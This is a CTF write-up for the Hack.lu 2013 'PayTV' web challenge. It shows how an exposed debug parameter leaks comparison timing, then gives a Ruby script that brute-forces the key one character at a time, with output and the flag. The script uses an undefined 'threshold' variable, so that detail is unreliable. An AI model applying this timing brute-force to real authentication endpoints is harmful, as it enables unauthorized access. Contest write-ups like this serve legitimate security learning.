---
layout: post
title: "Hack.lu 2013 - PayTV"
date: 2013-10-27 15:38
author: stacks0n
comments: true
categories: web, bruteforce, timing
---

## Challenge
These robo-friends were shocked to see that they had to pay to watch the news broadcast about the “Oktoberfest”. Can you help them?

Here is your challenge: https://ctf.fluxfingers.net:1316/

## Analysis
Notice the following code in key.js in which they have commented out additionally sending '&debug'
```
document.forms[0].addEventListener('submit', function(e) {
    var key = document.getElementById('key').value;
    var xhr = new XMLHttpRequest();
    xhr.open('post', document.forms[0].action);
    xhr.addEventListener('load', function() {
        data = JSON.parse(xhr.responseText);
        if (data['success']) {
            document.getElementById('error').style.display = 'none';
            document.getElementById('noise').style.display = 'none';
            document.getElementById('news').style.display = 'block';
            document.getElementById('newstext').innerHTML = data['response'];
        } else {
            document.getElementById('error').innerHTML = data['response'];
        }
    });
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('key=' + encodeURIComponent(key)/* + '&debug'*/)
    e.preventDefault();
    return false;
});
document.getElementById('key').focus();
```

Once we enable the debug parameter, we get some additional output in the response from the server:
```
{"start": 1382450009.388883, "end": 1382450009.388933, "response": "Wrong key.", "success": false}
```

The start and end times would indicate how long the comparison ran. I would guess that if we iterate character by character and compare the response times that we should be able to incrementally determine the password.

Running a few guesses manually, I am seeing that a correct character seems to incur a delay of at least 0.1 seconds, while most failures include a very short delay.

## Code
```ruby
#!/usr/bin/env ruby
require 'json'
require 'uri'
require 'net/http'

uri = URI("https://ctf.fluxfingers.net:1316/gimmetv")
headers =
{
    'Cookie' => "session=9ca658a4d71a9955b5ce2f573782d589ba7589ece79460c198ae4a98b39ea8072b589fce",
    'Content-Type' => "application/x-www-form-urlencoded"
}

keyspace = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-!@\#$%^&*()+=,./<>?`~{}[]\|"

i = 0
base = ""

while i < keyspace.size
    guess = keyspace[i]
    postdata = "key=#{URI.escape(base+guess)}&debug"

    https = Net::HTTP.new(uri.host, uri.port)
    https.use_ssl = true

    response = https.post(uri.path, postdata, headers)
    json = JSON.parse(response.body)
    elapsed = json['end'].to_f - json['start'].to_f

    # debugging
    # puts "Guess: #{base+guess}\tElapsed Time: #{elapsed}"

    if not json['response'].match(/Wrong key./)
        print guess
        puts ""
        puts json.inspect
        exit
    end

    # appears to be roughly 0.1 second for each correct character
    if elapsed > (0.1 * (base + guess).size)
        print guess
        base += guess
        threshold += elapsed
        i = -1
    else
    end
    i += 1
end
```

## Solution
```bash
% ruby paytv.rb
AXMNP93
{"start"=>1382454502.79326, "end"=>1382454503.49557, "response"=>"OH_THAT_ARTWORK!", "success"=>true}
```

```OH_THAT_ARTWORK!```
